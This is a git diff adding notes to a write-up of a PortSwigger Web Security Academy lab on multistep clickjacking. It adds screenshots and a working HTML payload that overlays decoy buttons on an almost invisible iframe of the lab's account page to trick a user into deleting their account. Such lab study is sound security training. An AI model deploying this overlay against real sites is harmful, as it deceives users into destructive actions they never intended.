@@ -294,3 +294,38 @@ You can log in to the account yourself using the following credentials: `wiener
 5. Click **Test me first** then hover over **Test me next** and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the `secondClick` class of the style sheet.
 6. Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click **Store** on the exploit server.
 
+- login page
+	![](Pasted%20image%2020241216205453.png)
+- delete account page
+	![](Pasted%20image%2020241216210309.png)
+- testing exploit for the first button (delete account)
+	![](Pasted%20image%2020241216210545.png)
+- testing exploit for the second button (yes)
+	![](Pasted%20image%2020241216210634.png)
+```html
+<style>
+	iframe {
+		position:relative;
+		width:700px;
+		height:600px ;
+		opacity: 0.001;
+		z-index: 2;
+	}
+   .firstClick, .secondClick {
+		position:absolute;
+		top:500px;
+		left:50px;
+		z-index: 1;
+	}
+   .secondClick {
+		top:300px;
+		left:225px;
+	}
+</style>
+
+<div class="firstClick">Click me first</div>
+
+<div class="secondClick">Click me next</div>
+
+<iframe src="https://0af300bf0434392f820ed39f0012006a.web-security-academy.net/my-account"></iframe>
+```
